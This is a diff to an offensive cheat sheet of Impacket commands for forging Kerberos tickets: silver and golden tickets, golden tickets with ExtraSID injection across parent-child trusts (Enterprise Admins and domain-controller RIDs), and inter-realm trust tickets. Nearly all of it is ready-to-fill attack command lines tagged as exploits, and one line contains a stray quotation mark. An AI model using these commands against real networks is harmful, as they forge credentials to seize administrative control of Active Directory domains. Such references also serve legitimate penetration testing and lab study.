@@ -4,39 +4,35 @@
 
 
 
-## silver ticket - generate TGS tickets into ccache format which can be converted further into kirbi.
+## silver ticket
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
+ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> -user-id <user_rid|500> <user|administrator>
 ```
 
 ## golden ticket  
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-ticketer.py -nthash <krbtgt_hash> -domain <domain_FQDN> -domain-sid <domain_sid> <user>
+ticketer.py -nthash <krbtgt_hash> -domain <domain_fqdn> -domain-sid <domain_sid> -user-id <user_rid|500> <user|administrator>
 ```
 
-## golden ticket - child-parent trust SIDHistory injection (nthash)
+## golden + ExtraSID (parent-child)  (nthash)
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 if user = administrator no need of -user-id
 ```
-ticketer.py -nthash <krbtgt_nthash>  -domain-sid <child_somain_sid> -domain <child_domain_FQDN> -extra-sid <root_domain_sid>-<rid|519> -user-id <user_rid> <user|jubeaz>
+ticketer.py -nthash <krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|519> -user-id <user_rid> <user|jubeaz>
 ```
 
-## golden ticket - child-parent trust SIDHistory injection (aeskey)
+## golden + ExtraSID (parent-child) (dc account)
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-ticketer.py -aesKey <krbtgt_aes_key> -domain-sid <child_somain_sid> -domain <child_domain_FQDN> -extra-sid <root_domain_sid>-<rid|519>  <user|jubeaz>
+ticketer.py -nthash <krbtgt_nthash> -domain-sid <child_somain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <dc_rid>  '<dc>$'
 ```
 
-## trust ticket (referral) -  
+## (golden) Inter-Realm TGT    
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
-RID
-    512 Domain Admins
-    519 Enterprise admins
-then 
     export KRB5CCNAME=/tmp/jubeaz.ccache   
-    getST.py -k -no-pass -spn <cifs>/<dc_fqdn> <src_domain_FQDN>/<user>@<domain_fqdn> -debug
+    getST.py -k -no-pass -spn <cifs>/<dc_fqdn> <src_domain_fqdn>/<user>@<domain_fqdn> -debug
 ```
-ticketer.py -nthash <trust_nthash> -domain-sid "src_domain_SID" -domain "src_domain_FQDN" -extra-sid "<dest_domain_SID>-<RID|519>" -spn "krbtgt/<dest_domain_FQDN>" <user|jubeaz>
+ticketer.py -nthash <trust_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<RID|519>" -spn "krbtgt/<dest_domain_fqdn>" -user-id <user_rid> <user|jubeaz>
 ```
